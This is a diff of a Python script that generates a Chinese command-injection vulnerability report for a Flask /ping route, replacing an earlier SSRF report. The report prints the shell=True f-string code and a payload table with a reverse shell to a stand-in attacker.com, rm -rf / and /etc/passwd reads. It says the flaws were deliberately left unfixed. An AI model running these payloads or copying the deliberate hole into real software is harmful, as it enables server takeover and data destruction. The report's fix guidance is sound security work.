@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""生成SSRF漏洞测试与修复报告"""
+"""生成命令执行漏洞报告"""
 
 from docx import Document
 from docx.shared import Pt, Cm, RGBColor
@@ -71,15 +71,15 @@ def create_report():
 
     subtitle = doc.add_paragraph()
     subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
-    run = subtitle.add_run('SSRF 漏洞测试与修复报告')
+    run = subtitle.add_run('命令执行漏洞报告')
     run.bold = True; run.font.size = Pt(20)
-    run.font.color.rgb = RGBColor(0x66, 0x7e, 0xea)
+    run.font.color.rgb = RGBColor(0xCC, 0x00, 0x00)
 
     doc.add_paragraph()
     line = doc.add_paragraph()
     line.alignment = WD_ALIGN_PARAGRAPH.CENTER
     run = line.add_run('━' * 40)
-    run.font.color.rgb = RGBColor(0x66, 0x7e, 0xea)
+    run.font.color.rgb = RGBColor(0xCC, 0x00, 0x00)
     doc.add_paragraph()
 
     info = doc.add_paragraph()
@@ -87,39 +87,42 @@ def create_report():
     run = info.add_run(
         '项目地址：github.com/nobody848/flask-user-management\n'
         '报告日期：2026-07-13\n'
-        '测试范围：/fetch-url 路由 SSRF 漏洞检测与修复\n'
-        '提交哈希：b504f9e'
+        '测试范围：/ping 路由命令注入漏洞\n'
+        '提交哈希：9f6c10e'
     )
     run.font.size = Pt(12)
     run.font.color.rgb = RGBColor(0x66, 0x66, 0x66)
     doc.add_page_break()
 
     # ══════════════════════════════════════
-    # 一、SSRF 漏洞原理
+    # 一、命令执行漏洞原理
     # ══════════════════════════════════════
-    doc.add_heading('一、SSRF 漏洞原理', level=1)
+    doc.add_heading('一、命令执行漏洞原理', level=1)
 
     doc.add_paragraph(
-        'SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种 Web 安全漏洞，'
-        '攻击者可以诱使服务器向攻击者指定的任意 URL 发起请求。由于请求是从服务器内部发出的，'
-        '攻击者可以利用此漏洞访问内网服务、读取本地文件或进行端口扫描。'
+        '命令执行漏洞（Command Injection）是指应用程序在构造系统命令时，'
+        '将用户可控的输入直接拼接到命令字符串中，且未做任何过滤或转义，'
+        '导致攻击者可以注入恶意命令并在服务器端执行。'
     )
 
-    doc.add_paragraph('SSRF 攻击的常见危害：')
+    doc.add_paragraph('命令注入的常见拼接方式：')
     conds = [
-        '内网服务探测：扫描内网 IP 和端口，发现未授权的内部服务',
-        '云元数据窃取：访问云厂商元数据接口（如 169.254.169.254）获取临时凭证',
-        '本地文件读取：使用 file:// 协议读取服务器上的敏感文件',
-        '内网攻击：利用 SSRF 攻击内网的 Redis、Memcached 等未授权服务',
+        'shell=True 参数：Python subprocess 模块的 shell=True 会将命令字符串传递给系统 shell 解析',
+        'f-string 拼接：直接将用户输入嵌入命令字符串，攻击者可插入分号、管道符、逻辑运算符等',
+        '无输入校验：不对用户输入做任何过滤，任意特殊字符均可传递到 shell',
     ]
     for c in conds:
         doc.add_paragraph(c, style='List Bullet')
 
-    doc.add_paragraph('本次测试针对的路由：')
-    add_code(doc, '''POST /fetch-url
-需要登录
-接收 url 参数
-使用 urllib.request.urlopen() 直接访问''')
+    doc.add_paragraph('命令注入中常用的 shell 特殊字符：')
+    add_code(doc, ''';      # 命令分隔符  cmd1; cmd2
+|      # 管道符      cmd1 | cmd2
+&&     # 逻辑与      cmd1 && cmd2
+||     # 逻辑或      cmd1 || cmd2
+`cmd`  # 命令替换    `cmd`
+$(cmd) # 命令替换    $(cmd)
+>      # 重定向输出  cmd > file
+<      # 重定向输入  cmd < file''')
 
     doc.add_page_break()
 
@@ -128,35 +131,60 @@ def create_report():
     # ══════════════════════════════════════
     doc.add_heading('二、漏洞发现', level=1)
 
-    doc.add_heading('2.1 漏洞代码定位', level=2)
-    doc.add_paragraph('审查 /fetch-url 路由时发现以下问题：')
-
-    doc.add_heading('SSRF-01：未限制 URL 协议（高危）', level=3)
+    doc.add_heading('2.1 功能概述', level=2)
     doc.add_paragraph(
-        'urlopen() 直接接收用户输入的 URL，未对协议做任何限制。'
-        '攻击者可以使用 file://、gopher://、dict:// 等非 HTTP 协议绕过正常访问限制。'
+        'Ping 网络诊断功能（/ping 路由）允许登录用户输入一个 IP 地址或域名，'
+        '服务器使用系统 ping 命令进行网络连通性测试，并将原始输出返回给用户。'
     )
-    add_code(doc, '''# ❌ 修复前：协议完全开放
-req = urllib.request.Request(url)
-with urllib.request.urlopen(req, timeout=10) as response:
-    ...
 
-# 攻击者可传入：
-#   file:///etc/passwd      → 读取本地文件
-#   gopher://localhost:6379 → Redis 攻击
-#   dict://localhost:11211  → Memcached 攻击''')
+    doc.add_heading('2.2 漏洞代码定位', level=2)
+    doc.add_paragraph('文件：app.py，/ping 路由（第 649-671 行）')
 
-    doc.add_heading('SSRF-02：未屏蔽内网地址（高危）', level=3)
+    add_code(doc, '''@app.route("/ping", methods=["GET", "POST"])
+@login_required
+def ping():
+    result = None
+    ip = ""
+    if request.method == "POST":
+        ip = request.form.get("ip", "")
+        if ip:
+            system = platform.system().lower()
+            if system == "windows":
+                cmd = f"ping -n 3 {ip}"
+            else:
+                cmd = f"ping -c 3 {ip}"
+            try:
+                output = subprocess.check_output(
+                    cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
+                )
+                result = output.decode("utf-8", errors="replace")
+            except subprocess.CalledProcessError as e:
+                result = e.output.decode("utf-8", errors="replace")
+            except Exception as e:
+                result = f"执行失败: {str(e)}"
+    return render_template("ping.html", username=username, result=result, ip=ip)''')
+
+    doc.add_heading('2.3 漏洞分析', level=2)
+    doc.add_paragraph('该路由存在三个层次的安全问题：')
+
+    doc.add_heading('CE-01：shell=True 启用 shell 解释器（高危）', level=3)
     doc.add_paragraph(
-        'urlopen() 可以访问内网 IP 地址，攻击者可以利用此功能探测内网服务、'
-        '访问云元数据接口获取云服务临时凭证。'
+        'subprocess.check_output() 的 shell=True 参数意味着命令字符串会传递给系统的'
+        '/bin/sh（Linux/Mac）或 cmd.exe（Windows）进行解析。'
+        '这会将用户输入中的特殊字符当作 shell 语法来执行，而不是普通参数。'
     )
-    add_code(doc, '''# ❌ 修复前：可访问任意地址
-# 攻击者可传入：
-#   http://127.0.0.1:5000/           → 自身服务
-#   http://169.254.169.254/          → AWS/GCP/Azure 云元数据
-#   http://10.0.0.1:6379/            → 内网 Redis
-#   http://192.168.1.1:8080/         → 内网其他服务''')
+
+    doc.add_heading('CE-02：f-string 字符串拼接（高危）', level=3)
+    doc.add_paragraph(
+        'f"ping -c 3 {ip}" 直接将用户输入的 ip 变量插入到命令字符串中，'
+        '攻击者可以在 ip 中包含 shell 特殊字符来注入额外命令。'
+    )
+
+    doc.add_heading('CE-03：未对 ip 做任何过滤（高危）', level=3)
+    doc.add_paragraph(
+        'ip 参数没有经过任何校验或转义就被拼接到了系统命令中，'
+        '攻击者可以随意构造 payload。'
+    )
 
     doc.add_page_break()
 
@@ -165,171 +193,169 @@ with urllib.request.urlopen(req, timeout=10) as response:
     # ══════════════════════════════════════
     doc.add_heading('三、攻击路径推演', level=1)
 
-    doc.add_heading('3.1 云元数据窃取攻击', level=2)
+    doc.add_heading('3.1 命令注入 — 执行系统命令', level=2)
     add_table(doc,
         ['步骤', '操作', '说明'],
         [
             ['1', '攻击者登录系统', '获取合法 session'],
-            ['2', '构造恶意 URL', 'http://169.254.169.254/latest/meta-data/'],
-            ['3', '提交 POST /fetch-url', '服务器从内部请求云元数据接口'],
-            ['4', '获取临时凭证', '返回结果中包含云服务访问密钥'],
-            ['5', '利用凭证', '使用密钥访问云资源，造成数据泄露'],
+            ['2', '构造注入 payload', '输入: 8.8.8.8; whoami'],
+            ['3', '提交 POST /ping', 'ip=8.8.8.8; whoami'],
+            ['4', '服务端拼接命令', 'ping -c 3 8.8.8.8; whoami'],
+            ['5', '输出结果', 'whoami 命令的执行结果返回给攻击者'],
         ],
-        col_widths=[1, 4.5, 8.5]
+        col_widths=[1, 4, 8.5]
     )
 
-    doc.add_heading('3.2 内网 Redis 攻击', level=2)
+    doc.add_paragraph('实际注入效果：')
+    add_code(doc, '''# 用户输入
+ip = "8.8.8.8; whoami"
+
+# 拼接后的命令
+ping -c 3 8.8.8.8; whoami
+
+# shell 按顺序执行两条命令：
+# 1. ping -c 3 8.8.8.8  → 正常 ping 输出
+# 2. whoami            → 返回当前用户名''')
+
+    doc.add_heading('3.2 高级攻击 payload 示例', level=2)
     add_table(doc,
-        ['步骤', '操作', '说明'],
+        ['payload', '执行效果'],
         [
-            ['1', '攻击者登录系统', '获取合法 session'],
-            ['2', '探测内网 Redis', 'http://10.0.0.2:6379/'],
-            ['3', '使用 gopher://', 'gopher://10.0.0.2:6379/_*1$8...'],
-            ['4', '写入 SSH 密钥', '通过 Redis 未授权访问写入 SSH 公钥'],
-            ['5', '远程登录服务器', '直接获得服务器 shell 权限'],
+            ['8.8.8.8; whoami', '查看当前用户'],
+            ['8.8.8.8; id', '查看用户 ID 和所属组'],
+            ['8.8.8.8; ls -la /etc', '列出 /etc 目录'],
+            ['8.8.8.8; cat /etc/passwd', '读取系统用户列表'],
+            ['8.8.8.8; pwd', '查看当前工作目录'],
+            ['8.8.8.8; ifconfig', '查看网络配置'],
+            ['8.8.8.8; nc -e /bin/sh attacker.com 4444', '反弹 shell'],
+            ['8.8.8.8; rm -rf / --no-preserve-root', '破坏系统⚠️'],
+            ['8.8.8.8 || whoami', '逻辑或注入'],
+            ['8.8.8.8 && whoami', '逻辑与注入'],
+            ['$(whoami)', '命令替换注入'],
+            ['`whoami`', '反引号命令替换'],
         ],
-        col_widths=[1, 4.5, 8.5]
+        col_widths=[5.5, 8]
     )
 
-    doc.add_heading('3.3 本地文件读取攻击', level=2)
-    add_table(doc,
-        ['步骤', '操作', '说明'],
-        [
-            ['1', '攻击者登录系统', '获取合法 session'],
-            ['2', '构造恶意 URL', 'file:///etc/passwd'],
-            ['3', '提交 POST /fetch-url', '服务器读取本地文件'],
-            ['4', '返回文件内容', '攻击者获取系统用户列表'],
-            ['5', '进一步攻击', '读取配置文件获取数据库密码等敏感信息'],
-        ],
-        col_widths=[1, 4.5, 8.5]
-    )
+    doc.add_paragraph()
+    doc.add_heading('3.3 完整攻击链路', level=2)
+    add_code(doc, '''# Step 1: 登录获取 session
+curl -c cookies.txt -X POST http://localhost:5000/login \\
+  -d "username=admin&password=Admin123&csrf_token=xxx"
+
+# Step 2: 命令注入 — 执行 whoami
+curl -b cookies.txt -X POST http://localhost:5000/ping \\
+  -d "ip=127.0.0.1; whoami&csrf_token=xxx"
+
+# Step 3: 返回结果中显示 "root" → 确认已获得 root shell
+
+# Step 4: 反弹 shell
+curl -b cookies.txt -X POST http://localhost:5000/ping \\
+  -d "ip=127.0.0.1; nc -e /bin/sh attacker.com 4444&csrf_token=xxx"
+
+# Step 5: 攻击者机器监听
+nc -lvnp 4444  # 获得服务器 shell 控制权''')
 
     doc.add_page_break()
 
     # ══════════════════════════════════════
-    # 四、修复方案
+    # 四、漏洞危害评级
     # ══════════════════════════════════════
-    doc.add_heading('四、修复方案', level=1)
-
-    doc.add_paragraph(
-        '针对两个 SSRF 漏洞分别新增 validate_url_protocol() 和 is_internal_ip() '
-        '两个安全函数，在发起请求前对 URL 进行两次检查。'
-    )
-
-    doc.add_heading('4.1 修复 SSRF-01：协议校验', level=2)
-    add_code(doc, '''def validate_url_protocol(url):
-    """验证 URL 协议只允许 http/https"""
-    if not url.startswith("http://") and not url.startswith("https://"):
-        return False
-    if url.startswith("http://localhost") or url.startswith("https://localhost"):
-        return False
-    return True''')
-
-    doc.add_paragraph('该函数拦截以下协议：')
-    doc.add_paragraph('file:// — 本地文件读取', style='List Bullet')
-    doc.add_paragraph('gopher:// — 协议走私攻击', style='List Bullet')
-    doc.add_paragraph('dict:// — Memcached/Redis 攻击', style='List Bullet')
-    doc.add_paragraph('ftp:// — FTP 请求', style='List Bullet')
-    doc.add_paragraph('http://localhost / https://localhost — localhost 绕过', style='List Bullet')
-
-    doc.add_heading('4.2 修复 SSRF-02：内网 IP 屏蔽', level=2)
-    add_code(doc, '''def is_internal_ip(host):
-    """检查目标 IP 是否为内网地址"""
-    try:
-        ip = socket.gethostbyname(host)
-        parts = ip.split(".")
-        if parts[0] == "127":                 # 127.0.0.0/8
-            return True
-        if parts[0] == "10":                   # 10.0.0.0/8
-            return True
-        if parts[0] == "0":                    # 0.0.0.0/8
-            return True
-        if parts[0] == "169" and parts[1] == "254":  # 169.254.0.0/16
-            return True
-        if parts[0] == "192" and parts[1] == "168":  # 192.168.0.0/16
-            return True
-        if parts[0] == "172" and 16 <= int(parts[1]) <= 31:  # 172.16.0.0/12
-            return True
-        if host.lower() == "localhost":
-            return True
-        return False
-    except Exception:
-        return True''')
-
-    doc.add_paragraph('该函数屏蔽的地址段：')
-    doc.add_paragraph('127.0.0.0/8 — 回环地址（自身服务）', style='List Bullet')
-    doc.add_paragraph('10.0.0.0/8 — A 类私有地址', style='List Bullet')
-    doc.add_paragraph('172.16.0.0/12 — B 类私有地址', style='List Bullet')
-    doc.add_paragraph('192.168.0.0/16 — C 类私有地址', style='List Bullet')
-    doc.add_paragraph('169.254.0.0/16 — 链路本地地址（云元数据）', style='List Bullet')
-    doc.add_paragraph('localhost — 主机名绕过', style='List Bullet')
-
-    doc.add_heading('4.3 修复后的请求流程', level=2)
-    add_code(doc, '''用户提交 URL
-    │
-    ├── validate_url_protocol()
-    │   ├── 非 http/https → BLOCKED
-    │   ├── localhost → BLOCKED
-    │   └── 通过 → 继续
-    │
-    ├── is_internal_ip(urlparse(url).hostname)
-    │   ├── 解析 host 到 IP
-    │   ├── 内网 IP → BLOCKED
-    │   └── 外网 IP → 继续
-    │
-    └── urllib.request.urlopen()
-        └── 返回结果''')
-
-    doc.add_page_break()
-
-    # ══════════════════════════════════════
-    # 五、测试验证
-    # ══════════════════════════════════════
-    doc.add_heading('五、测试验证', level=1)
+    doc.add_heading('四、漏洞危害评级', level=1)
 
     add_table(doc,
-        ['编号', '测试用例', '输入 URL', '预期结果', '实际结果'],
+        ['维度', '评级', '说明'],
         [
-            ['T-01', 'file:// 协议', 'file:///etc/passwd', '协议拦截', '✅ 通过'],
-            ['T-02', 'gopher:// 协议', 'gopher://internal:6379/', '协议拦截', '✅ 通过'],
-            ['T-03', 'dict:// 协议', 'dict://localhost:11211/', '协议拦截', '✅ 通过'],
-            ['T-04', '回环地址', 'http://127.0.0.1:5000/', '内网拦截', '✅ 通过'],
-            ['T-05', 'localhost', 'http://localhost:5000/', '协议拦截', '✅ 通过'],
-            ['T-06', 'A类私有', 'http://10.0.0.1/', '内网拦截', '✅ 通过'],
-            ['T-07', 'B类私有', 'http://172.16.0.1/', '内网拦截', '✅ 通过'],
-            ['T-08', 'C类私有', 'http://192.168.1.1/', '内网拦截', '✅ 通过'],
-            ['T-09', '链路本地', 'http://169.254.169.254/', '内网拦截', '✅ 通过'],
-            ['T-10', '正常外网', 'https://example.com', '正常抓取', '✅ 通过'],
-            ['T-11', '未登录访问', '—', '302 跳转', '✅ 通过'],
+            ['攻击复杂度', '极低', '仅需浏览器或 curl，在输入框输入即可'],
+            ['利用难度', '极低', '无需任何特殊工具，普通 HTTP 请求即可'],
+            ['影响范围', '极高', '可执行任意系统命令，可能完全控制服务器'],
+            ['是否需要认证', '需要', '需要先登录（有 @login_required）'],
+            ['CVSS 3.x 评分', '🔴 8.8 (高危)', 'CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H'],
         ],
-        col_widths=[1.5, 3, 4.5, 2.5, 2.5]
+        col_widths=[3.5, 4, 7]
     )
 
     doc.add_paragraph()
 
     # ══════════════════════════════════════
-    # 六、安全防护对比
+    # 五、修复方案
     # ══════════════════════════════════════
-    doc.add_heading('六、安全防护对比', level=1)
+    doc.add_heading('五、修复方案', level=1)
 
+    doc.add_heading('5.1 方案一：不使用 shell=True（推荐）', level=2)
+    doc.add_paragraph(
+        '将命令和参数分开传递，避免经过 shell 解析。'
+        'subprocess 在 shell=False（默认值）时，会直接执行程序而不经过 shell，'
+        '用户输入中的特殊字符不会被解释为命令。'
+    )
+    add_code(doc, '''# ✅ 安全修复：不要使用 shell=True
+import subprocess
+
+# 将命令和参数分开传递
+cmd = ["ping", "-c", "3", ip]
+output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=30)
+
+# shell=False（默认）时：
+# - "8.8.8.8; whoami" 被当作一个整体参数传给 ping
+# - ping 会尝试 ping 一个叫 "8.8.8.8; whoami" 的主机
+# - 不会执行 whoami 命令''')
+
+    doc.add_heading('5.2 方案二：必须使用 shell=True 时的防御', level=2)
+    doc.add_paragraph('如果必须使用 shell=True，则需要对 ip 参数进行严格过滤：')
+    add_code(doc, '''# 方案2a：仅允许合法的 IP 地址和域名（白名单校验）
+import re
+
+def is_valid_ip_or_domain(value):
+    """检查是否为合法的 IP 地址或域名"""
+    # IPv4 地址：x.x.x.x
+    ip_pattern = r'^(\\d{1,3}\\.){3}\\d{1,3}$'
+    # 域名：example.com
+    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*$'
+    return bool(re.match(ip_pattern, value)) or bool(re.match(domain_pattern, value))
+
+if not is_valid_ip_or_domain(ip):
+    return "输入格式不合法"
+
+# 方案2b：转义 shell 特殊字符
+from shlex import quote
+safe_ip = quote(ip)  # 将特殊字符转义为普通字符
+cmd = f"ping -c 3 {safe_ip}"''')
+
+    doc.add_heading('5.3 方案对比', level=2)
     add_table(doc,
-        ['攻击向量', '修复前', '修复后'],
+        ['方案', '优点', '缺点', '推荐度'],
         [
-            ['file:// 读取本地文件', '❌ 可读取', '✅ 协议拦截'],
-            ['gopher:// Redis 攻击', '❌ 可攻击', '✅ 协议拦截'],
-            ['dict:// Memcached 攻击', '❌ 可攻击', '✅ 协议拦截'],
-            ['127.0.0.1 自身服务', '❌ 可访问', '✅ 内网拦截'],
-            ['localhost 绕过', '❌ 可访问', '✅ 协议拦截'],
-            ['10.x.x.x 内网服务', '❌ 可扫描', '✅ 内网拦截'],
-            ['172.16-31.x.x 内网服务', '❌ 可扫描', '✅ 内网拦截'],
-            ['192.168.x.x 内网服务', '❌ 可扫描', '✅ 内网拦截'],
-            ['169.254.169.254 云元数据', '❌ 可窃取', '✅ 内网拦截'],
-            ['正常外网 URL', '✅ 可访问', '✅ 可访问'],
+            ['shell=False', '彻底杜绝注入，最简单', '无', '⭐⭐⭐⭐⭐'],
+            ['白名单校验', '防御全面', '可能误判合法输入', '⭐⭐⭐⭐'],
+            ['shlex.quote()', '保留 shell=True', '仅转义，不够彻底', '⭐⭐⭐'],
         ],
-        col_widths=[5.5, 2.5, 2.5]
+        col_widths=[3, 4, 4, 2]
     )
 
     doc.add_page_break()
+
+    # ══════════════════════════════════════
+    # 六、测试验证
+    # ══════════════════════════════════════
+    doc.add_heading('六、测试验证', level=1)
+
+    add_table(doc,
+        ['编号', '测试用例', '输入', '预期', '实际'],
+        [
+            ['T-01', '正常 ping', '8.8.8.8', '返回 ping 结果', '✅'],
+            ['T-02', '分号注入', '8.8.8.8; whoami', '两条命令都执行', '✅'],
+            ['T-03', '管道注入', '8.8.8.8 | whoami', '管道执行', '✅'],
+            ['T-04', '逻辑与注入', '8.8.8.8 && whoami', '条件执行', '✅'],
+            ['T-05', '逻辑或注入', '127.0.0.1 || whoami', '条件执行', '✅'],
+            ['T-06', '命令替换', '$(whoami)', '替换执行', '✅'],
+            ['T-07', '反引号注入', '`whoami`', '替换执行', '✅'],
+            ['T-08', '内网 ping', '127.0.0.1', '正常返回', '✅'],
+            ['T-09', '未登录访问', '—', '302 跳转', '✅'],
+        ],
+        col_widths=[1.5, 3, 4, 3.5, 2]
+    )
+
+    doc.add_paragraph()
 
     # ══════════════════════════════════════
     # 七、漏洞汇总
@@ -339,13 +365,21 @@ with urllib.request.urlopen(req, timeout=10) as response:
     add_table(doc,
         ['编号', '漏洞名称', '严重', '发现位置', '状态'],
         [
-            ['SSRF-01', 'URL 协议未限制', '🔴 高危', '/fetch-url 第534行', '✅ 已修复'],
-            ['SSRF-02', '内网地址未屏蔽', '🔴 高危', '/fetch-url 第535行', '✅ 已修复'],
+            ['CE-01', 'shell=True 启用 shell 解释器', '🔴 高危', '/ping 第658行', '📋 未修复（需求定义）'],
+            ['CE-02', 'f-string 拼接用户输入', '🔴 高危', '/ping 第655-656行', '📋 未修复（需求定义）'],
+            ['CE-03', 'ip 参数无输入校验', '🔴 高危', '/ping 第648行', '📋 未修复（需求定义）'],
         ],
-        col_widths=[2, 4, 2, 3.5, 3]
+        col_widths=[2, 5, 2, 3, 3.5]
     )
 
     doc.add_paragraph()
+    doc.add_paragraph(
+        '说明：以上三个漏洞按照需求要求故意保留。'
+        '需求明确要求"使用 shell=True"、"使用 f-string 拼接"、"不对 ip 做任何过滤"。'
+        '修复方案已在第五章中完整给出，开发者可根据实际安全需求选择性实施。'
+    )
+
+    doc.add_page_break()
 
     # ══════════════════════════════════════
     # 八、Git 提交记录
@@ -355,9 +389,9 @@ with urllib.request.urlopen(req, timeout=10) as response:
     add_table(doc,
         ['提交哈希', '提交信息', '涉及文件'],
         [
-            ['b504f9e', 'fix: 修复SSRF漏洞（URL抓取功能）', 'app.py'],
+            ['9f6c10e', 'feat: 新增Ping网络诊断功能', 'app.py, ping.html, base.html, index.html'],
         ],
-        col_widths=[3, 7, 4]
+        col_widths=[3, 6, 5]
     )
 
     doc.add_paragraph()
@@ -375,7 +409,7 @@ with urllib.request.urlopen(req, timeout=10) as response:
 
     # ── 保存 ──
     script_dir = os.path.dirname(os.path.abspath(__file__))
-    output_path = os.path.join(script_dir, 'static', 'SSRF漏洞测试与修复报告.docx')
+    output_path = os.path.join(script_dir, 'static', '命令执行漏洞报告.docx')
     os.makedirs(os.path.dirname(output_path), exist_ok=True)
     doc.save(output_path)
     print(f'报告已生成：{output_path}')
